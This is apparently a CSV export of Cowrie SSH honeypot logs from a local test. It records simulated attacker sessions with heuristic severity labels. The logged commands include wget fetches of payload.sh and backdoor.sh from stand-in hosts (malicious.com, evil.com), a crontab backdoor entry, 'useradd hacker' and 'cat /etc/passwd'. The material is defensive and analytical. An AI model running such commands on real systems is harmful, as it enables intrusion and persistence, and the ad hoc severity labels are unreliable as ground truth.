timestamp,eventid,src_ip,session,username,password,command,message,protocol,recon_activity,malware_activity,privilege_escalation,destructive_behavior,persistence_behavior,command_length,failed_command,severity
2026-05-17T18:29:27.420740Z,cowrie.session.connect,127.0.0.1,da4482c69c46,,,,New connection: 127.0.0.1:48584 (127.0.0.1:2222) [session: da4482c69c46],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:27.425758Z,cowrie.client.version,127.0.0.1,da4482c69c46,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:27.432190Z,cowrie.client.kex,127.0.0.1,da4482c69c46,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:45.221953Z,cowrie.login.success,127.0.0.1,da4482c69c46,root,123123455,,login attempt [root/123123455] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:45.291252Z,cowrie.client.size,127.0.0.1,da4482c69c46,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:45.292489Z,cowrie.client.var,127.0.0.1,da4482c69c46,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:45.293515Z,cowrie.client.var,127.0.0.1,da4482c69c46,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:29:45.296459Z,cowrie.session.params,127.0.0.1,da4482c69c46,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:30:51.155913Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:30:51.159589Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
2026-05-17T18:30:51.163787Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:30:51.167083Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:30:51.176011Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,netstat -an,CMD: netstat -an,ssh,1,0,0,0,0,11,0,Low
2026-05-17T18:30:53.324466Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,history,CMD: history,ssh,0,0,0,0,0,7,0,Normal
2026-05-17T18:31:08.550043Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
2026-05-17T18:31:11.601588Z,cowrie.session.file_download,127.0.0.1,da4482c69c46,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:31:13.235975Z,cowrie.session.file_download,127.0.0.1,da4482c69c46,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:31:52.729352Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
2026-05-17T18:31:52.730512Z,cowrie.command.failed,127.0.0.1,da4482c69c46,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
2026-05-17T18:31:58.736527Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:31:58.738799Z,cowrie.log.closed,127.0.0.1,da4482c69c46,,,,Closing TTY Log: var/lib/cowrie/tty/45d63988366d5fb2ed72247064638149561ca9e26efff74d6f1fa222d38ef219 after 133.4 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:31:58.756446Z,cowrie.session.closed,127.0.0.1,da4482c69c46,,,,Connection lost after 151.3 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:41.204407Z,cowrie.session.connect,127.0.0.1,2bb5a86b7093,,,,New connection: 127.0.0.1:54544 (127.0.0.1:2222) [session: 2bb5a86b7093],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:41.208420Z,cowrie.client.version,127.0.0.1,2bb5a86b7093,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:41.211985Z,cowrie.client.kex,127.0.0.1,2bb5a86b7093,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:47.643384Z,cowrie.login.success,127.0.0.1,2bb5a86b7093,root,98mn90,,login attempt [root/98mn90] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:47.711091Z,cowrie.client.size,127.0.0.1,2bb5a86b7093,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:47.711452Z,cowrie.client.var,127.0.0.1,2bb5a86b7093,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:47.711700Z,cowrie.client.var,127.0.0.1,2bb5a86b7093,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:34:47.712336Z,cowrie.session.params,127.0.0.1,2bb5a86b7093,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:35:03.801263Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,nmap 192.168.211.129,CMD: nmap 192.168.211.129,ssh,0,0,0,0,0,20,0,Normal
2026-05-17T18:35:03.802384Z,cowrie.command.failed,127.0.0.1,2bb5a86b7093,,,nmap 192.168.211.129,Command not found: nmap 192.168.211.129,ssh,0,0,0,0,0,20,1,Normal
2026-05-17T18:35:24.210984Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,wget http://malicious-site/payload.sh,CMD: wget http://malicious-site/payload.sh,ssh,0,1,0,0,0,37,0,Medium
2026-05-17T18:35:31.943661Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
2026-05-17T18:35:31.944598Z,cowrie.command.failed,127.0.0.1,2bb5a86b7093,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
2026-05-17T18:35:35.786320Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:35:35.788129Z,cowrie.log.closed,127.0.0.1,2bb5a86b7093,,,,Closing TTY Log: var/lib/cowrie/tty/1390b6b7a9b1893b7021ebd87f043e917f2099c621cd0fef466ef47b1e3c67a0 after 48.1 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:35:35.792497Z,cowrie.session.closed,127.0.0.1,2bb5a86b7093,,,,Connection lost after 54.6 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:17.887060Z,cowrie.session.connect,127.0.0.1,7be35f00199d,,,,New connection: 127.0.0.1:36956 (127.0.0.1:2222) [session: 7be35f00199d],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:17.888583Z,cowrie.client.version,127.0.0.1,7be35f00199d,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:17.890274Z,cowrie.client.kex,127.0.0.1,7be35f00199d,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:23.025173Z,cowrie.login.success,127.0.0.1,7be35f00199d,root,8hjnmpoi,,login attempt [root/8hjnmpoi] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:23.059926Z,cowrie.client.size,127.0.0.1,7be35f00199d,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:23.060558Z,cowrie.client.var,127.0.0.1,7be35f00199d,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:23.061128Z,cowrie.client.var,127.0.0.1,7be35f00199d,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:23.062077Z,cowrie.session.params,127.0.0.1,7be35f00199d,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:36:29.283628Z,cowrie.command.input,127.0.0.1,7be35f00199d,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
2026-05-17T18:36:37.461889Z,cowrie.command.input,127.0.0.1,7be35f00199d,,,useradd hacker,CMD: useradd hacker,ssh,0,0,0,0,1,14,0,High
2026-05-17T18:41:23.046109Z,cowrie.session.file_download,127.0.0.1,7be35f00199d,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:41:23.048095Z,cowrie.log.closed,127.0.0.1,7be35f00199d,,,,Closing TTY Log: var/lib/cowrie/tty/e275d92f078d1ade8059289c1719537ce4f157adeb87c5bcc021c279552987d5 after 300.0 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:41:23.050645Z,cowrie.session.closed,127.0.0.1,7be35f00199d,,,,Connection lost after 305.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:05.710906Z,cowrie.session.connect,127.0.0.1,6a57879b4d6f,,,,New connection: 127.0.0.1:53686 (127.0.0.1:2222) [session: 6a57879b4d6f],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:05.713386Z,cowrie.client.version,127.0.0.1,6a57879b4d6f,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:05.714997Z,cowrie.client.kex,127.0.0.1,6a57879b4d6f,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:16.399731Z,cowrie.login.success,127.0.0.1,6a57879b4d6f,root,878hvftg,,login attempt [root/878hvftg] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:16.444938Z,cowrie.client.size,127.0.0.1,6a57879b4d6f,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:16.445729Z,cowrie.client.var,127.0.0.1,6a57879b4d6f,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:16.446464Z,cowrie.client.var,127.0.0.1,6a57879b4d6f,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:43:16.449313Z,cowrie.session.params,127.0.0.1,6a57879b4d6f,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:44:15.223377Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:44:15.226246Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
2026-05-17T18:44:15.231723Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:44:15.234912Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:44:15.241329Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,netstat -an,CMD: netstat -an,ssh,1,0,0,0,0,11,0,Low
2026-05-17T18:44:15.245640Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
2026-05-17T18:44:17.215565Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:44:17.952217Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:43.387904Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,exitexit,CMD: exitexit,ssh,0,0,0,0,0,8,0,Normal
2026-05-17T18:45:43.389444Z,cowrie.command.failed,127.0.0.1,6a57879b4d6f,,,exitexit ,Command not found: exitexit ,ssh,0,0,0,0,0,9,1,Normal
2026-05-17T18:45:48.772351Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:45:48.774801Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:48.775931Z,cowrie.log.closed,127.0.0.1,6a57879b4d6f,,,,Closing TTY Log: var/lib/cowrie/tty/ca77caeebddf9d274e75235bf62315ea861cc5602de51330360b6ea9c6dffe3f after 152.3 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:48.779039Z,cowrie.session.closed,127.0.0.1,6a57879b4d6f,,,,Connection lost after 163.1 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:50.789613Z,cowrie.session.connect,127.0.0.1,f41884e81d66,,,,New connection: 127.0.0.1:47244 (127.0.0.1:2222) [session: f41884e81d66],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:50.791104Z,cowrie.client.version,127.0.0.1,f41884e81d66,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:50.792904Z,cowrie.client.kex,127.0.0.1,f41884e81d66,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:45:56.168396Z,cowrie.login.success,127.0.0.1,f41884e81d66,root,cfvgbqwe,,login attempt [root/cfvgbqwe] succeeded,ssh,0,0,0,0,0,0,0,Normal
